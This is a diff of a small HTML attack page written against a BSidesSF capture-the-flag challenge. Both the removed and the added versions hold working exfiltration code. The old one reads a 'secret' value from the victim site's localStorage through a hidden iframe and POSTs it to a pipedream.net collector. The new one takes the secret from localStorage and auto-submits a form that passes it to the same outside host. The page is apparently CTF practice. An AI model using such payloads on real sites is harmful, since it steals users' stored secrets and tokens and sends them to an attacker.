@@ -2,36 +2,21 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Arstotzka Hack Portal</title>
+  <title>Arstotzka Attack</title>
 </head>
 <body>
-  <h1>Loading...</h1>
+  <h1>Submitting...</h1>
 
-  <iframe id="victim" src="https://moa-station-1d1d1aaf.challenges.bsidessf.net/" style="display:none;"></iframe>
+  <form id="form" action="https://moa-station-1d1d1aaf.challenges.bsidessf.net/submit-url" method="POST">
+    <input type="hidden" name="url" id="urlInput" value="">
+  </form>
 
   <script>
-    const iframe = document.getElementById('victim');
-
-    iframe.onload = function() {
-      try {
-        const secret = iframe.contentWindow.localStorage.getItem('secret');
-        if (secret) {
-          fetch('https://eozxolyh76p7q9f.m.pipedream.net', {
-            method: 'POST',
-            mode: 'no-cors',
-            body: secret
-          });
-        }
-      } catch (e) {
-        // Скорее всего CORS ошибка
-        fetch('https://eozxolyh76p7q9f.m.pipedream.net', {
-          method: 'POST',
-          mode: 'no-cors',
-          body: 'CORS Error: ' + e.message
-        });
-      }
-    };
+    const secret = localStorage.getItem('secret');
+    if (secret) {
+      document.getElementById('urlInput').value = "https://eozxolyh76p7q9f.m.pipedream.net/?" + encodeURIComponent(secret);
+      document.getElementById('form').submit();
+    }
   </script>
-
 </body>
 </html>
